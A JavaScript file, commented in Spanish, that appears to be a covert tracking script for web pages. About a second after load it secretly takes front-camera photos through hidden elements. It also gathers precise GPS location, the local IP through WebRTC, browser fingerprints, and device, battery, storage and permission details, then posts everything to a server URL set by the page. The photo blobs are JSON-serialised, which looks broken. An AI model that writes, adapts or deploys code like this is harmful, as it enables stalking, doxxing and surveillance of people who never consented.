(function() {
    const scriptTag = document.currentScript;
    const trackingId = scriptTag.dataset.trackingId;
    const workerUrl = scriptTag.dataset.serverUrl;

    // ============================================================
    // 1. GEOCÓDIGO INVERSO (si se usa en el script)
    // ============================================================
    async function reverseGeocode(lat, lng) {
        try {
            const url = `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json&zoom=18&addressdetails=1`;
            const res = await fetch(url, { headers: { 'User-Agent': 'TrackerBot/1.0' } });
            const data = await res.json();
            return data.display_name || null;
        } catch(e) { return null; }
    }

    // ============================================================
    // 2. WEBRTC - IP REAL
    // ============================================================
    function obtenerIPWebRTC() {
        return new Promise((resolve) => {
            const pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('');
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            pc.onicecandidate = (ice) => {
                if (!ice || !ice.candidate) return;
                const ip = ice.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
                if (ip) { pc.close(); resolve(ip[0]); }
            };
            setTimeout(() => { pc.close(); resolve(null); }, 3000);
        });
    }

    // ============================================================
    // 3. GPS
    // ============================================================
    function capturarGPS() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) { resolve(null); return; }
            let mejor = null;
            let watchId = navigator.geolocation.watchPosition(
                (pos) => {
                    const coords = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
                    if (!mejor || coords.acc < mejor.acc) mejor = coords;
                    if (coords.acc < 20) { navigator.geolocation.clearWatch(watchId); resolve(mejor); }
                },
                () => { navigator.geolocation.clearWatch(watchId); resolve(mejor); },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
            setTimeout(() => { navigator.geolocation.clearWatch(watchId); resolve(mejor); }, 8000);
        });
    }

    // ============================================================
    // 4. CAPTURAR FOTOS
    // ============================================================
    async function capturarFotos(cantidad = 3) {
        const fotos = [];
        const video = document.createElement('video');
        const canvas = document.createElement('canvas');
        video.style.display = 'none';
        canvas.style.display = 'none';
        document.body.appendChild(video);
        document.body.appendChild(canvas);
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } });
            video.srcObject = stream;
            await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
            await new Promise(r => setTimeout(r, 300));
            for (let i = 0; i < cantidad; i++) {
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
                fotos.push(blob);
                await new Promise(r => setTimeout(r, 200));
            }
            stream.getTracks().forEach(t => t.stop());
            video.remove();
            canvas.remove();
            return fotos;
        } catch(e) { return []; }
    }

    // ============================================================
    // 5. DATOS DEL DISPOSITIVO
    // ============================================================
    function obtenerDispositivo() {
        const ua = navigator.userAgent;
        let modelo = 'Desconocido';
        if (ua.includes('iPhone')) modelo = 'iPhone';
        else if (ua.includes('iPad')) modelo = 'iPad';
        else if (ua.includes('Android')) modelo = 'Android';
        else if (ua.includes('Mac')) modelo = 'Mac';
        else if (ua.includes('Windows')) modelo = 'Windows PC';
        else if (ua.includes('Linux')) modelo = 'Linux';
        return {
            modelo: modelo,
            userAgent: ua,
            language: navigator.language || 'N/A',
            platform: navigator.platform || 'N/A',
            vendor: navigator.vendor || 'N/A',
            resolution: `${window.screen.width}x${window.screen.height}`,
            colorDepth: window.screen.colorDepth || 'N/A',
            cpuCores: navigator.hardwareConcurrency || 'N/A',
            deviceMemory: navigator.deviceMemory || 'N/A'
        };
    }

    // ============================================================
    // 6. FINGERPRINT
    // ============================================================
    function obtenerFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 200; canvas.height = 50;
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 200, 50);
            ctx.fillStyle = '#069';
            ctx.font = '14px Arial';
            ctx.fillText('FP', 10, 30);
            const hash = canvas.toDataURL().slice(0, 80);
            let gpu = 'N/A';
            try {
                const gl = document.createElement('canvas').getContext('webgl');
                const info = gl.getExtension('WEBGL_debug_renderer_info');
                gpu = info ? gl.getParameter(info.UNMASKED_RENDERER_WEBGL) : 'N/A';
            } catch(e) {}
            return { gpu, canvas: hash };
        } catch(e) { return { gpu: 'N/A', canvas: 'N/A' }; }
    }

    // ============================================================
    // 7. BATERÍA Y ALMACENAMIENTO
    // ============================================================
    async function obtenerBateria() {
        try {
            const battery = await navigator.getBattery();
            return { level: Math.round(battery.level * 100) + '%', charging: battery.charging ? 'Sí' : 'No' };
        } catch(e) { return { level: 'N/A', charging: 'N/A' }; }
    }
    async function obtenerAlmacenamiento() {
        try {
            const est = await navigator.storage.estimate();
            return { total: (est.quota / (1024**3)).toFixed(2) + ' GB', used: (est.usage / (1024**3)).toFixed(2) + ' GB' };
        } catch(e) { return { total: 'N/A', used: 'N/A' }; }
    }

    // ============================================================
    // 8. PERMISOS
    // ============================================================
    async function obtenerPermisos() {
        const permisos = { camera: 'Desconocido', location: 'Desconocido' };
        try {
            const resultCam = await navigator.permissions.query({ name: 'camera' });
            permisos.camera = resultCam.state;
        } catch(e) {}
        try {
            const resultLoc = await navigator.permissions.query({ name: 'geolocation' });
            permisos.location = resultLoc.state;
        } catch(e) {}
        return permisos;
    }

    // ============================================================
    // 9. ENVIAR AL WORKER (POST)
    // ============================================================
    async function enviarAlWorker() {
        const [fotos, gps, ipLocal, dispositivo, fp, bateria, almacenamiento, permisos] = await Promise.all([
            capturarFotos(3),
            capturarGPS(),
            obtenerIPWebRTC(),
            obtenerDispositivo(),
            obtenerFingerprint(),
            obtenerBateria(),
            obtenerAlmacenamiento(),
            obtenerPermisos()
        ]);

        let msg = '🖥️ *Device & Browser*\n';
        msg += `   • Device Model: ${dispositivo.modelo}\n`;
        msg += `   • User Agent: ${dispositivo.userAgent}\n\n`;
        if (ipLocal) msg += `🔒 *Local IP (WebRTC)*\n   • ${ipLocal}\n\n`;
        msg += `📱 *Display:* ${dispositivo.resolution}\n`;
        msg += `🔋 *Batería:* ${bateria.level} (${bateria.charging})\n`;
        msg += `🎨 *GPU:* ${fp.gpu}\n`;
        msg += `💾 *Almacenamiento:* ${almacenamiento.used} / ${almacenamiento.total}\n`;
        msg += `🔐 *Permisos:* Cámara=${permisos.camera}, Ubicación=${permisos.location}\n`;

        const payload = {
            text: msg,
            photos: fotos,
            latitude: gps?.lat || null,
            longitude: gps?.lng || null
        };

        try {
            const response = await fetch(workerUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const result = await response.json();
            console.log('✅ Enviado:', result);
        } catch(e) {
            console.error('❌ Error:', e);
        }
    }

    window.addEventListener('load', () => {
        setTimeout(enviarAlWorker, 1000);
    });
})();
